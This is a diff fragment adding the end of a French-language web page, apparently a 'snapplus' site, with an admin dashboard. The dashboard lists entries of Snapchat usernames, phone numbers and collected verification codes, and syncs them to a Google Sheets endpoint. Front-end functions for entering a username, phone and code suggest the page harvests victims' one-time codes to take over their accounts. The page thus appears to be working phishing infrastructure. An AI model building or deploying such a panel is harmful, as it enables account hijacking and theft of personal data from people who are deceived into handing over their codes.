+          <div class="entry-phone">📱 ${e.phone}</div>
+          <div class="entry-time">🕐 ${e.time}</div>
+        </div>
+        <div class="entry-right">
+          ${isValidated
+            ? `<div class="code-display">${e.code}</div>`
+            : `<div class="code-display pending-code">En attente du code...</div>`
+          }
+          <span class="status-badge ${isValidated ? 'validated' : 'pending'}">
+            ${isValidated ? '✅ Code reçu' : '⏳ En attente'}
+          </span>
+          <button class="btn-delete" onclick="deleteEntry(${idx})" title="Supprimer">🗑</button>
+        </div>
+      </div>`;
+  }
+  function renderDashList() {
+    const el = document.getElementById('dashList');
+    const last5 = [...adminEntries].reverse().slice(0, 5);
+    if (last5.length === 0) {
+      el.innerHTML = `<div class="empty-state"><div class="icon">📭</div><p>Aucune demande pour l'instant.<br>Les nouvelles entrées apparaîtront ici.</p></div>`;
+    } else {
+      el.innerHTML = last5.map((e, i) => entryHTML(e, adminEntries.length - 1 - i)).join('');
+    }
+  }
+  function renderEntriesList() {
+    const el = document.getElementById('entriesList');
+    const filtered = [...adminEntries].reverse().filter(e =>
+      !filterText ||
+      (e.snap && e.snap.toLowerCase().includes(filterText)) ||
+      (e.phone && e.phone.includes(filterText))
+    );
+    document.getElementById('entriesCount').textContent = `${filtered.length} demande${filtered.length !== 1 ? 's' : ''}`;
+    if (filtered.length === 0) {
+      el.innerHTML = `<div class="empty-state"><div class="icon">🔍</div><p>Aucun résultat.</p></div>`;
+    } else {
+      el.innerHTML = filtered.map((e, i) => entryHTML(e, adminEntries.length - 1 - i)).join('');
+    }
+  }
+  function filterEntries(val) {
+    filterText = val.toLowerCase();
+    renderEntriesList();
+  }
+  function deleteEntry(idx) {
+    if (!confirm('Supprimer cette entrée ?')) return;
+    const entry = adminEntries[idx];
+    if (!entry) return;
+    // Envoie la suppression à Google Sheets via le numéro de téléphone
+    fetch(GS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ action: 'delete', phone: entry.phone, snap: entry.snap })
+    }).catch(() => {});
+    adminEntries.splice(idx, 1);
+    updateStats();
+    renderDashList();
+    renderEntriesList();
+  }
+  function clearAll() {
+    if (!confirm('Effacer TOUTES les données ? Cette action est irréversible.')) return;
+    adminEntries = [];
+    localStorage.setItem('snapplus_entries', JSON.stringify(adminEntries));
+    refreshData();
+  }
+  function startAutoRefresh() {
+    setInterval(refreshData, 30000);
+  }
+
+  // Expose toutes les fonctions globalement (fix Cloudflare/emergentagent)
+  window.openModal = openModal;
+  window.closeModal = closeModal;
+  window.goToAdmin = goToAdmin;
+  window.backToLanding = backToLanding;
+  window.goToSnap = goToSnap;
+  window.goToPhone = goToPhone;
+  window.goToCode = goToCode;
+  window.validateCode = validateCode;
+  window.resendCode = resendCode;
+  window.retryModal = retryModal;
+  window.tryLogin = tryLogin;
+  window.logout = logout;
+  window.showAdminPage = showAdminPage;
+  window.toggleSidebar = toggleSidebar;
+  window.refreshData = refreshData;
+  window.filterEntries = filterEntries;
+  window.deleteEntry = deleteEntry;
+  window.clearAll = clearAll;
+  window.clearAllData = clearAllData;
+  window.openReviews = openReviews;
+  window.closeReviews = closeReviews;
+  window.openLegal = openLegal;
+  window.closeLegal = closeLegal;
+</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9f94e1ffd91dc714',t:'MTc3ODM3MzUyNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; visibility: hidden;"></iframe><script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7f7b0fd8732c4326aae4b9d58d5c514a&quot;,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+</body></html>
